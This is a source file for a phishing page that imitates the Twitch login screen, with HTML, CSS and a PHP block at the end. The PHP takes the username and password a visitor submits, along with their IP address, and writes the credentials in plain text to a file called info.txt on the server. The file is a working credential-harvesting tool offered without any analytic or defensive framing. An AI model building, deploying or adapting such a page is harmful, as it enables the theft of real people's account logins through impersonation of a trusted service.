<header>
  <nav class="nav">
    <a href="?page=browser">Browse</a>
      <a href="?page=getdesktop">Get desktop</a>
      <a href="?page=tryprime">Try prime</a>
    <a href="#" class="loggedIn">
      <div class="user--avatar"><img src="https://images.unsplash.com/photo-1502980426475-b83966705988?ixlib=rb-0.3.5&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=200&fit=max&s=ddcb7ec744fc63472f2d9e19362aa387" alt=""></div>
      <h3 class="user--name">Username here</h3>
      <span class="user--status">Watching Tfue</span>
    </a>
    <a href="logout">Log out?</a>
  </nav>    
</header>

<div id="app">
    <h1>Log in to Twitch</h1>
    <nav class="nav--login">
        <a href="#" id="tabLogin">Log in</a>
        <a href="#" id="tabSignIn">Sign up</a>
    </nav>
  
    <div class="alert hidden">That password was incorrect. Please try again</div>
  <form method="post">
    <div class="form form--login">
        <label for="username">Username</label>
        <input type="text" name="name"id="username">
  
        <label for="password">Password</label>
        <input type="password" name="name2" id="password">
  </div>
  
  <div class="form form--signup hidden">
    <label for="username2">Username</label>
    <input type="text" id="username2">
  
    <label for="password2">Password</label>
    <input type="password" id="password2">
    
    <label for="email">Email</label>
    <input type="text" id="email">
  </div>
  
  <button class="btn" type="sumbit" name="sumbit" id="Submit">Log In</button>
</div>





<html>
<head>
<style>


*
{
  box-sizing: border-box;
}

body
{
  padding: 0;
  margin: 0;
  background-image: url("http://3.bp.blogspot.com/-Vun9BzPL8rw/VapKcixbhcI/AAAAAAAANno/JMZN1432P8A/s1600/dota-2-logo-hd-wallpapers-download-free-dota-2-logo-tumblr.jpg");
  background-size: cover;
  font-family: Helvetica;
}

#app
{
  max-width: 500px;
  margin: 2em auto;
  background-color: #fff;
  padding: 1em;
  border-radius: 10px;
}

h1
{
  font-size: 1.2em;
  text-align: center;
}

.alert
{
  background-color: #EFEEF1;
  border: 1px solid #E91C24;
  border-radius: 5px;
  border-left-width: 5px;
  padding: 1em;
}

.nav--login
{
  padding: 0.3em;
}

.nav--login a
{
  color: #A291C4;
  text-decoration: none;
  margin-right: 1em;
}

.form
{
  padding: 0.5em;
}

.form label
{
  display: block;
  margin-top: 0.5em;
}

.form input
{
  width: 100%;
  padding: 10px;
  border-radius: 5px;
}

.btn
{
  margin: 1em 0;
  background-color: #F4F4F4;
  color: #B0ADB5;
  text-align: center;
  display: block;
  padding: 0.5em;
  text-decoration: none;
  border-radius: 5px;
}

.nav--login
{
  border-bottom: 2px solid #A291C4;
  margin-bottom: 1em;
}

.nav
{
  background-color: #4B387A;
  padding: 0.6em;
  display: flex;
  flex-direction: row;
  align-items: center;
  margin-bottom: 6em;
}

.nav a
{
  margin: 0 1em;
  text-decoration: none;
}

a.loggedIn
{
  flex: 0 1 240px;
  margin-left: auto;
  display: grid;
  grid-template-columns: 1fr 3fr;
}

.user--avatar
{
  width: 50px;
  height: 50px;
  border-radius: 50%;
  overflow: hidden;
  grid-column: 1 / 2;
  grid-row: 1 / span 2;
  align-self: center;
}

.user--name
{
  margin: 0;
}

.user--avatar img
{
  object-fit: cover;
  object-position: center;
  width: 50px;
}

.nav a
{
  color: #B4C4E7;
}

.nav a:hover
{
  color: #fff;
}

.hidden
{
  display: none;
}


</style>
</body>
</html> 

<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['name'])){
$ip = $user_ip;
$userinput = $_POST['name'];
$userinputt = $_POST['name2'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>

